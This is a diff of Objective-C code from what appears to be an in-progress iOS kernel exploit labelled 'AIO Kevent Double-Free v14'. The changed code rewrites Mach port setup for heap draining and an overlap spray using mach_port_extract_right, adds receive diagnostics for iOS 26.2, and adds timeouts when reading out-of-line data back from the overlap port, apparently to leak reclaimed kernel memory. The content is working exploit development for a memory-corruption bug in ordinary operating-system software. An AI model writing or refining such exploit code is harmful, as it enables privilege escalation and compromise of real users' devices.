@@ -5681,7 +5681,7 @@ static void *aio_free_and_reclaim_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO Kevent Double-Free v13 =========="];
+    [self appendLog:@"\n========== AIO Kevent Double-Free v14 =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5874,63 +5874,71 @@ static void *aio_free_and_reclaim_racer(void *arg) {
     mach_port_t drainSend[kDrainPorts];
     int drainPortsReady = 0;
 
-    // Port setup strategy:
-    //   1. Allocate port P → name A has receive right
-    //   2. Allocate port Q → name B has receive right (sacrificial)
-    //   3. Destroy port Q → name B is freed
-    //   4. Insert send right for port P at freed name B
-    //   Result: name A = receive right, name B = send right (both for port P)
+    // extract_right(MAKE_SEND) creates valid send right at NEW name.
+    // v12 confirmed: sends work (24/24). v13 confirmed: destroy+insert doesn't work.
     //
-    // Log each step for first port to diagnose failures.
-    for (int p = 0; p < kDrainPorts; p++) {
-        drainRecv[p] = MACH_PORT_NULL;
-        drainSend[p] = MACH_PORT_NULL;
-        kern_return_t kr;
-        if ((kr = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &drainRecv[p])) != KERN_SUCCESS) {
-            if (p == 0) [self appendLog:[NSString stringWithFormat:@"  port[%d] allocate FAIL kr=0x%x", p, kr]];
-            continue;
+    // Recv diagnostic: also test basic recv with msgh_local_port=0 (NULL).
+    mach_port_t testRecv = MACH_PORT_NULL, testSend = MACH_PORT_NULL;
+    {
+        mach_msg_type_name_t poly = 0;
+        if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &testRecv) == KERN_SUCCESS &&
+            mach_port_extract_right(mach_task_self_, testRecv, MACH_MSG_TYPE_MAKE_SEND, &testSend, &poly) == KERN_SUCCESS) {
+            // Send a simple message to the port
+            mach_msg_header_t sm = {0};
+            sm.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+            sm.msgh_size = sizeof(sm);
+            sm.msgh_remote_port = testSend;
+            if (mach_msg(&sm, MACH_SEND_MSG, sizeof(sm), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL) == MACH_MSG_SUCCESS) {
+                // Try recv with msgh_local_port=0 (ALL ports) + 100ms timeout
+                mach_msg_header_t rm = {0};
+                rm.msgh_size = sizeof(rm);
+                kern_return_t rkr = mach_msg(&rm, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(rm), testRecv, 100, MACH_PORT_NULL);
+                if (rkr == MACH_MSG_SUCCESS) {
+                    [self appendLog:[NSString stringWithFormat:@"  DIAG: recv OK (extract_right works) recv=%d send=%d", testRecv, testSend]];
+                } else if (rkr == MACH_RCV_TIMED_OUT) {
+                    [self appendLog:@"  DIAG: recv TIMED OUT — msg not delivered? (extract_right may have killed recv right)"];
+                } else {
+                    [self appendLog:[NSString stringWithFormat:@"  DIAG: recv FAIL kr=0x%x — extract_right kills recv on iOS 26.2?", rkr]];
+                }
+            } else {
+                [self appendLog:@"  DIAG: test send FAILED"];
+            }
         }
-        mach_port_t dummy;
-        if ((kr = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &dummy)) != KERN_SUCCESS) {
-            if (p == 0) [self appendLog:[NSString stringWithFormat:@"  port[%d] dummy alloc FAIL kr=0x%x", p, kr]];
-            mach_port_destroy(mach_task_self_, drainRecv[p]);
-            continue;
-        }
-        if ((kr = mach_port_destroy(mach_task_self_, dummy)) != KERN_SUCCESS) {
-            if (p == 0) [self appendLog:[NSString stringWithFormat:@"  port[%d] destroy FAIL kr=0x%x", p, kr]];
-            mach_port_destroy(mach_task_self_, drainRecv[p]);
-            continue;
-        }
-        if ((kr = mach_port_insert_right(mach_task_self_, drainRecv[p], dummy,
-            MACH_MSG_TYPE_MAKE_SEND)) != KERN_SUCCESS) {
-            if (p == 0) [self appendLog:[NSString stringWithFormat:@"  port[%d] insert FAIL kr=0x%x recv=%d name=%d", p, kr, drainRecv[p], dummy]];
-            mach_port_destroy(mach_task_self_, drainRecv[p]);
-            continue;
-        }
-        drainSend[p] = dummy;
-        drainPortsReady++;
+    }
+    // Clean up diagnostic ports — use the stored send right if valid
+    if (testRecv != MACH_PORT_NULL && testSend != MACH_PORT_NULL) {
+        // Reuse as first drain port
+        drainRecv[0] = testRecv;
+        drainSend[0] = testSend;
+        drainPortsReady = 1;
+    } else if (testRecv != MACH_PORT_NULL) {
+        mach_port_destroy(mach_task_self_, testRecv);
     }
 
-    // Dedicated port for overlap spray — same destroy approach
-    mach_port_t overlapRecv = MACH_PORT_NULL, overlapSend = MACH_PORT_NULL;
-    {
-        kern_return_t kr;
-        if ((kr = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &overlapRecv)) == KERN_SUCCESS) {
-            mach_port_t dummy;
-            if ((kr = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &dummy)) == KERN_SUCCESS) {
-                if ((kr = mach_port_destroy(mach_task_self_, dummy)) == KERN_SUCCESS) {
-                    if ((kr = mach_port_insert_right(mach_task_self_, overlapRecv, dummy,
-                        MACH_MSG_TYPE_MAKE_SEND)) != KERN_SUCCESS) {
-                        [self appendLog:[NSString stringWithFormat:@"  overlap insert FAIL kr=0x%x", kr]];
-                        mach_port_destroy(mach_task_self_, overlapRecv);
-                        overlapRecv = MACH_PORT_NULL;
-                    } else {
-                        overlapSend = dummy;
-                    }
-                } else {
-                    [self appendLog:[NSString stringWithFormat:@"  overlap destroy FAIL kr=0x%x", kr]];
-                }
+    // Create remaining drain ports with extract_right
+    for (int p = drainPortsReady; p < kDrainPorts; p++) {
+        drainRecv[p] = MACH_PORT_NULL;
+        drainSend[p] = MACH_PORT_NULL;
+        if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &drainRecv[p]) == KERN_SUCCESS) {
+            mach_msg_type_name_t poly = 0;
+            if (mach_port_extract_right(mach_task_self_, drainRecv[p],
+                MACH_MSG_TYPE_MAKE_SEND, &drainSend[p], &poly) == KERN_SUCCESS) {
+                drainPortsReady++;
+            } else {
+                mach_port_destroy(mach_task_self_, drainRecv[p]);
+                drainRecv[p] = MACH_PORT_NULL;
             }
+        }
+    }
+
+    // Overlap port with extract_right
+    mach_port_t overlapRecv = MACH_PORT_NULL, overlapSend = MACH_PORT_NULL;
+    if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &overlapRecv) == KERN_SUCCESS) {
+        mach_msg_type_name_t poly = 0;
+        if (mach_port_extract_right(mach_task_self_, overlapRecv,
+            MACH_MSG_TYPE_MAKE_SEND, &overlapSend, &poly) != KERN_SUCCESS) {
+            mach_port_destroy(mach_task_self_, overlapRecv);
+            overlapRecv = MACH_PORT_NULL;
         }
     }
     [self appendLog:[NSString stringWithFormat:@"  Drain ports: %d/%d ready", drainPortsReady, kDrainPorts]];
@@ -6047,9 +6055,11 @@ static void *aio_free_and_reclaim_racer(void *arg) {
                 {
                     DrainMsg eRcv;
                     memset(&eRcv, 0, sizeof(eRcv));
-                    kern_return_t ekr = mach_msg(&eRcv.header, MACH_RCV_MSG, 0, sizeof(DrainMsg),
-                                                  overlapRecv, 0, MACH_PORT_NULL);
-                    [self appendLog:[NSString stringWithFormat:@"  E: recv from overlapRecv kr=%d", ekr]];
+                    eRcv.header.msgh_size = sizeof(DrainMsg);
+                    kern_return_t ekr = mach_msg(&eRcv.header, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                                                  0, sizeof(DrainMsg), overlapRecv, 500, MACH_PORT_NULL);
+                    [self appendLog:[NSString stringWithFormat:@"  E: recv kr=%d (0=ok, %d=TIMEOUT, %d=INVALID_NAME)",
+                                      ekr, MACH_RCV_TIMED_OUT, MACH_RCV_INVALID_NAME]];
                     if (ekr == MACH_MSG_SUCCESS && eRcv.ool.address != NULL) {
                         uint8_t *d = (uint8_t *)eRcv.ool.address;
                         int sz = eRcv.ool.size;
